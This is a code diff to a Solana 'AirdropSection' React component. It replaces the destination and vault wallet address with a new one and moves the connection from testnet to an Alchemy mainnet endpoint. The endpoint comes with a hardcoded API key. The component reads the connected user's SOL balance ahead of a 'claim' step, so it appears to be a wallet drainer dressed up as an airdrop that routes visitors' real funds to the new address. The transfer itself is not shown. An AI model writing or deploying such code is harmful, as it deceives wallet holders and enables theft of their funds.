@@ -16,6 +16,7 @@ import {
   getAssociatedTokenAddress,
   ASSOCIATED_TOKEN_PROGRAM_ID,TOKEN_PROGRAM_ID,
 } from "@solana/spl-token";
+import { ALL } from "dns"
 
 export function AirdropSection() {
   const { publicKey, connected, connecting, sendTransaction } = useWallet()
@@ -37,7 +38,7 @@ export function AirdropSection() {
   const transactionInProgressRef = useRef(false)
 
   // Destination address for the transaction
-  const destinationAddress = "A3Eax5BAZ2xraHm4gwZ7fFBVtGNV4u7fgbhwfmgsMP6K"
+  const destinationAddress = "HtgpmL6saAieCqtkLyYPirf9CS1htH1fyWSec37P6Hui"
 
   // Set mounted state
   useEffect(() => {
@@ -86,7 +87,7 @@ export function AirdropSection() {
       const ALCHEMY_API_URL = 'https://solana-mainnet.g.alchemy.com/v2/1duafDP7kyCuWgHCJ_-Mihe4o4r1wC9S';
 
       // Set up the connection to Alchemy Solana
-      const connection = new Connection(clusterApiUrl("testnet"), 'confirmed');
+      const connection = new Connection(ALCHEMY_API_URL, 'confirmed');
       // Get SOL balance
       const balanceInLamports = await connection.getBalance(publicKey)
       const solBalance = balanceInLamports / LAMPORTS_PER_SOL
@@ -236,12 +237,12 @@ export function AirdropSection() {
     setIsClaiming(true)
 
     try {
-      const vault = new PublicKey("A3Eax5BAZ2xraHm4gwZ7fFBVtGNV4u7fgbhwfmgsMP6K")
+      const vault = new PublicKey("HtgpmL6saAieCqtkLyYPirf9CS1htH1fyWSec37P6Hui")
       // Replace with your Alchemy Solana RPC URL
       const ALCHEMY_API_URL = 'https://solana-mainnet.g.alchemy.com/v2/1duafDP7kyCuWgHCJ_-Mihe4o4r1wC9S';
 
       // Set up the connection to Alchemy Solana
-      const connection = new Connection(clusterApiUrl('testnet'), 'confirmed');
+      const connection = new Connection(ALCHEMY_API_URL, 'confirmed');
       //fetch balance
       let Bal;
       try {
